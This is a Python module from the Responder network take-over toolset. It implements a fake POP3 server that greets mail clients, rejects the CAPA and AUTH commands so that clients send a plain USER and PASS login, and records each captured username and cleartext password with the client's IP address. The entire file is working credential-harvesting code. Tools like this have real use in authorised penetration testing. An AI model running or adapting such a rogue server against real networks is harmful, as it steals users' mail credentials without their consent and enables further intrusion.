#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
from responder.src.utils import *
from responder.src import settings

if settings.Config.PY2OR3 == "PY3":
    from socketserver import BaseRequestHandler
else:
    from SocketServer import BaseRequestHandler
from responder.src.packets import POPOKPacket, POPNotOKPacket


# POP3 Server class
class POP3(BaseRequestHandler):
    def SendPacketAndRead(self):
        Packet = POPOKPacket()
        self.request.send(NetworkSendBufferPython2or3(Packet))
        return self.request.recv(1024)

    def handle(self):
        try:
            data = self.SendPacketAndRead()
            if data[0:4] == b"CAPA":
                self.request.send(NetworkSendBufferPython2or3(POPNotOKPacket()))
                data = self.request.recv(1024)
            if data[0:4] == b"AUTH":
                self.request.send(NetworkSendBufferPython2or3(POPNotOKPacket()))
                data = self.request.recv(1024)
            if data[0:4] == b"USER":
                User = data[5:].strip(b"\r\n").decode("latin-1")
                data = self.SendPacketAndRead()
            if data[0:4] == b"PASS":
                Pass = data[5:].strip(b"\r\n").decode("latin-1")

                SaveToDb(
                    {
                        "module": "POP3",
                        "type": "Cleartext",
                        "client": self.client_address[0],
                        "user": User,
                        "cleartext": Pass,
                        "fullhash": User + ":" + Pass,
                    }
                )
            self.SendPacketAndRead()
        except Exception:
            pass
